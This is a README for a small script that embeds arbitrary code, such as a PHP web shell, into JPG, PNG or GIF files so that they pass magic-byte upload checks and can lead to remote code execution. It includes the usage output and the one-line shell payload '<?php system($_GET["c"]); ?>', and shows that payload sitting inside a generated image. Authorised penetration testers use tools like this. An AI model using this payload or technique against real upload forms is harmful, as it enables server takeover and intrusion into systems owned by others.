## What is inj2med ?
`Inj2med` is a little script to embed malicious piece of code into an image file like `jpeg/jpg`, `png` and `gif`.

An example use case is like - suppose you have a file upload functionality in a php web application. The backend is validating the file type based on `magic headers`. In such scenario, you can create a valid image file using magic bytes and then embed arbitrary php code into it. If you are able to trigger this file after uploading as a php script, you might be able to achieve RCE.

## How to use ?

```
$ python3 inj2med.py -h
usage: inj2med.py [-h] [-e EXTENSION] -p PAYLOAD [-f FILENAME]

optional arguments:
  -h, --help            show this help message and exit
  -e EXTENSION, --extension EXTENSION
                        specify the extenstion to use, must be jpg/png/gif
  -p PAYLOAD, --payload PAYLOAD
                        specify the payload to use, e.g. '<?php system($_GET['c']); ?>'
  -f FILENAME, --filename FILENAME
                        specify a filename to use
```

```
$ python3 inj2med.py -e jpg -p '<?php system($_GET["c"]); ?>'
File saved as UrDsOrcipQ.jpg.
```

```
$ file UrDsOrcipQ.jpg 
UrDsOrcipQ.jpg: JPEG image data
```

```
$ cat UrDsOrcipQ.jpg 
����<?php system($_GET["c"]); ?>
```

## Limitations 
It currently supports only `jpg`, `png` and `gif` files. In future, I will add more file types.

**NOTE** - I got this idea from a similar script called `inj2media`. But that script is not available anywhere now. So I decided to create my own script.

